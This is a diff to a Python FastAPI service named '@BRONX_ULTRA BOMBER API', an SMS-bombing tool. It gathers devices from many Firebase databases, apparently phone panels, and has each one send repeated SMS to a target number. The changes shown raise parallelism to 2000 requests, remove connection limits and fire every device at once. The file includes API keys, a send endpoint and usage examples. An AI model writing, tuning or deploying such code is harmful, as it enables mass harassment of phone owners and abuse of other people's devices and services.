@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════╗
-║   🔥 @BRONX_ULTRA BOMBER API v7                         ║
+║   🔥 @BRONX_ULTRA BOMBER API v7.1                       ║
 ║   ▸ API Key Protected (6 keys)                          ║
-║   ▸ Full Fan-Out (har device × count)                   ║
+║   ▸ TRUE Full Fan-Out (ALL devices × count parallel)    ║
 ║   ▸ /stop endpoint                                      ║
 ║   ▸ Flash Speed 🚄                                      ║
 ║   ▸ Vercel Ready                                        ║
@@ -38,47 +38,55 @@ VALID_KEYS = {
 # 🔥 FIREBASE URLs
 # ═══════════════════════════════════════════════════════════
 FIREBASE_URLS = [
-    "https://aawasbaba-c07c6-default-rtdb.firebaseio.com",
-    "https://aditya-9f66b-default-rtdb.firebaseio.com",
-    "https://alwaysatiif7-default-rtdb.firebaseio.com",
-    "https://bega-8457c-default-rtdb.firebaseio.com",
-    "https://check-skyler-default-rtdb.firebaseio.com",
-    "https://chilgumsir-default-rtdb.firebaseio.com",
-    "https://crdio-3cf5c-default-rtdb.firebaseio.com",
-    "https://deepk-hh-default-rtdb.firebaseio.com",
-    "https://desert-fc320-default-rtdb.firebaseio.com",
-    "https://fudofficer-cdc70-default-rtdb.firebaseio.com",
-    "https://gfaatelisell-default-rtdb.firebaseio.com",
-    "https://htbc51-default-rtdb.firebaseio.com",
-    "https://kalih-f389d-default-rtdb.firebaseio.com",
-    "https://keepsnss-default-rtdb.firebaseio.com",
-    "https://krijhjuiiccyy-default-rtdb.firebaseio.com",
-    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
-    "https://master-panel-6bcfe-default-rtdb.firebaseio.com",
-    "https://maxo12-default-rtdb.firebaseio.com",
-    "https://mmmmnnnnn-4ba6f-default-rtdb.firebaseio.com",
-    "https://mook-1ddfc-default-rtdb.firebaseio.com",
-    "https://navin-9fb56-default-rtdb.firebaseio.com",
-    "https://shadow-f9cd3-default-rtdb.firebaseio.com",
-    "https://sk-paid-panel-default-rtdb.firebaseio.com",
-    "https://tinmur-777e8-default-rtdb.firebaseio.com",
-    "https://vasu-new-panel-default-rtdb.firebaseio.com",
-    "https://bhai-138a8-default-rtdb.firebaseio.com",
-    "https://flash-v8enginepower-default-rtdb.firebaseio.com",
-    "https://deepa-1b7d0-default-rtdb.firebaseio.com",
-    "https://panel-9-d6ece-default-rtdb.firebaseio.com",
     "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
-    "https://sivam-8f7ed-default-rtdb.firebaseio.com",
     "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
     "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
-    "https://adani-5dd2c-default-rtdb.firebaseio.com",
     "https://rambhai-2c356-default-rtdb.firebaseio.com",
     "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
-    "https://pintu-3f058-default-rtdb.firebaseio.com",
-    "https://amit2-dc1b7-default-rtdb.firebaseio.com",
-    "https://biharibhaiya-c718b-default-rtdb.firebaseio.com",
-    "https://project9-default-rtdb.firebaseio.com",
-    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com",
+    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
+    "https://surajptiyanka-default-rtdb.firebaseio.com",
+    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
+    "https://online-a2823-default-rtdb.firebaseio.com",
+    "https://awakenn88-default-rtdb.firebaseio.com",
+    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
+    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
+    "https://rambhai-2c356-default-rtdb.firebaseio.com",
+    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
+    "https://surajptiyanka-default-rtdb.firebaseio.com",
+    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
+    "https://online-a2823-default-rtdb.firebaseio.com",
+    "https://awakenn88-default-rtdb.firebaseio.com",
+    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
+    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
+    "https://rambhai-2c356-default-rtdb.firebaseio.com",
+    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
+    "https://surajptiyanka-default-rtdb.firebaseio.com",
+    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
+    "https://online-a2823-default-rtdb.firebaseio.com",
+    "https://awakenn88-default-rtdb.firebaseio.com",
+    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
+    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
+    "https://rambhai-2c356-default-rtdb.firebaseio.com",
+    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
+    "https://surajptiyanka-default-rtdb.firebaseio.com",
+    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
+    "https://online-a2823-default-rtdb.firebaseio.com",
+    "https://awakenn88-default-rtdb.firebaseio.com",
+    
 ]
 
 SEND_ENDPOINTS = [
@@ -89,12 +97,16 @@ SEND_ENDPOINTS = [
     "sendSms/{id}.json",
 ]
 
-MAX_CONCURRENT = 150
-BATCH_CHUNK = 500
+# ═══════════════════════════════════════════════════════════
+# ⚙️ SPEED SETTINGS — TUNED FOR FULL FAN-OUT
+# ═══════════════════════════════════════════════════════════
+MAX_CONCURRENT = 2000      # ⬆️ 150 → 2000 (massive parallel)
+BATCH_CHUNK = 2000         # ⬆️ 500 → 2000 (bigger batches)
 REQUEST_TIMEOUT = 8
+CONNECT_TIMEOUT = 3
 
 API_NAME = "@BRONX_ULTRA"
-API_VERSION = "7.0"
+API_VERSION = "7.1"
 
 # ═══════════════════════════════════════════════════════════
 # 🚀 APP
@@ -102,7 +114,7 @@ API_VERSION = "7.0"
 app = FastAPI(
     title=f"🔥 {API_NAME} BOMBER API",
     version=API_VERSION,
-    description="Ultra Firebase Bomber — Key Protected"
+    description="Ultra Firebase Bomber — Key Protected | Full Fan-Out"
 )
 
 app.add_middleware(
@@ -173,7 +185,7 @@ def clean_url(url: str) -> str:
 
 
 # ═══════════════════════════════════════════════════════════
-# 📡 FETCH DEVICES
+# 📡 FETCH DEVICES — ALL FIREBASES IN PARALLEL
 # ═══════════════════════════════════════════════════════════
 async def fetch_devices_from(session, url):
     base = clean_url(url)
@@ -194,6 +206,7 @@ async def fetch_devices_from(session, url):
 
 
 async def get_all_devices(session):
+    """Fetch devices from ALL firebases simultaneously"""
     results = await asyncio.gather(
         *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
         return_exceptions=True,
@@ -206,7 +219,7 @@ async def get_all_devices(session):
 
 
 # ═══════════════════════════════════════════════════════════
-# 💣 SEND ONE
+# 💣 SEND ONE — Fast single fire
 # ═══════════════════════════════════════════════════════════
 async def send_one(session, device, target, message, sem, stats):
     async with sem:
@@ -246,7 +259,7 @@ async def is_stopped(number: str) -> bool:
 
 
 # ═══════════════════════════════════════════════════════════
-# 💣 FULL FAN-OUT WORKER
+# 💣 FULL FAN-OUT WORKER — EVERY DEVICE FIRES SIMULTANEOUSLY
 # ═══════════════════════════════════════════════════════════
 async def bomb_worker(number: str, message: str, count: int, api_key: str):
     jid = str(uuid4())[:8]
@@ -259,10 +272,18 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
             pass
     _LOCAL_STOP.discard(number)
 
+    # 🔥 UNLIMITED CONNECTIONS — full parallel
     connector = aiohttp.TCPConnector(
-        limit=1000, limit_per_host=200, ttl_dns_cache=300
+        limit=0,                # 0 = unlimited total
+        limit_per_host=0,       # 0 = unlimited per host
+        ttl_dns_cache=300,
+        force_close=False,
+        enable_cleanup_closed=True,
     )
-    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=4)
+    timeout = aiohttp.ClientTimeout(
+        total=REQUEST_TIMEOUT,
+        connect=CONNECT_TIMEOUT,
+    )
     headers = {
         "User-Agent": f"{API_NAME}/v{API_VERSION}",
         "Content-Type": "application/json",
@@ -271,6 +292,7 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
     async with aiohttp.ClientSession(
         connector=connector, timeout=timeout, headers=headers
     ) as session:
+        # 📡 Get ALL devices from ALL firebases in parallel
         devices = await get_all_devices(session)
         if not devices:
             print(f"[{jid}] ❌ No devices online")
@@ -278,8 +300,9 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
 
         ndev = len(devices)
         total = ndev * count
+
         print(f"\n{'='*55}")
-        print(f"[{jid}] 🔥 {API_NAME} JOB STARTED")
+        print(f"[{jid}] 🔥 {API_NAME} FULL FAN-OUT STARTED")
         print(f"[{jid}] Key        : {api_key}")
         print(f"[{jid}] Target     : {number}")
         print(f"[{jid}] Message    : {message[:40]}")
@@ -291,29 +314,43 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
         sem = asyncio.Semaphore(MAX_CONCURRENT)
         stats = {"success": 0, "failed": 0, "blocked": 0}
 
-        processed = 0
-        while processed < total:
+        # ✅ BUILD ALL TASKS — every device × every count (TRUE FAN-OUT)
+        all_tasks = []
+        for device in devices:
+            for _ in range(count):
+                all_tasks.append(
+                    send_one(session, device, number, message, sem, stats)
+                )
+
+        total_tasks = len(all_tasks)
+        print(f"[{jid}] 🚀 Firing {total_tasks} parallel requests "
+              f"(sem={MAX_CONCURRENT})...")
+
+        # ✅ FIRE IN BIG BATCHES — all within batch run in parallel
+        completed = 0
+        cancelled = False
+        for i in range(0, total_tasks, BATCH_CHUNK):
+            # 🛑 STOP CHECK before each batch
             if await is_stopped(number):
-                print(f"[{jid}] 🛑 STOPPED at {processed}/{total}")
+                print(f"[{jid}] 🛑 STOPPED at {completed}/{total_tasks}")
+                cancelled = True
+                for t in all_tasks[i:]:
+                    t.cancel()
                 break
 
-            chunk_end = min(processed + BATCH_CHUNK, total)
-            tasks = []
-            for idx in range(processed, chunk_end):
-                device = devices[(idx // count) % ndev]
-                tasks.append(send_one(session, device, number, message, sem, stats))
-
-            await asyncio.gather(*tasks, return_exceptions=True)
-            processed = chunk_end
+            chunk = all_tasks[i:i + BATCH_CHUNK]
+            await asyncio.gather(*chunk, return_exceptions=True)
+            completed += len(chunk)
 
             elapsed_sf = time.time() - t0
-            print(f"[{jid}] ⚡ {processed}/{total} | OK={stats['success']} | "
+            print(f"[{jid}] ⚡ {completed}/{total_tasks} | "
+                  f"OK={stats['success']} | BLK={stats['blocked']} | "
                   f"{elapsed_sf:.1f}s")
 
         elapsed = round(time.time() - t0, 2)
         speed = round(stats["success"] / elapsed, 1) if elapsed else 0
 
-        print(f"\n[{jid}] ✅ DONE")
+        print(f"\n[{jid}] {'🛑 STOPPED' if cancelled else '✅ DONE'}")
         print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
               f"Blocked={stats['blocked']}")
         print(f"[{jid}] Time={elapsed}s | Speed={speed}/s 🚄")
@@ -332,6 +369,7 @@ async def root():
         "protected": True,
         "firebases_loaded": len(FIREBASE_URLS),
         "redis": "connected" if redis else "off",
+        "mode": "FULL FAN-OUT — all devices × count simultaneously",
         "how_to_use": {
             "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=5",
             "stop": "/stop?key=YOUR_KEY&number=9876543210",
@@ -447,9 +485,10 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
         "key_used": api_key,
         "target": number,
         "per_device": count,
-        "note": "Total SMS = (online devices) × count",
+        "mode": "FULL FAN-OUT",
+        "note": "Total SMS = (online devices) × count — ALL in parallel",
         "stop_url": f"/stop?key={api_key}&number={number}",
-        "warning": "⚡ Requests are firing in background",
+        "warning": "⚡ All devices firing simultaneously in background",
     }
 
 
@@ -518,8 +557,8 @@ async def devices_endpoint(request: Request, key: str = Query(None)):
             status_code=401,
         )
 
-    connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
-    timeout = aiohttp.ClientTimeout(total=10, connect=5)
+    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
+    timeout = aiohttp.ClientTimeout(total=15, connect=5)
     async with aiohttp.ClientSession(
         connector=connector, timeout=timeout
     ) as session:
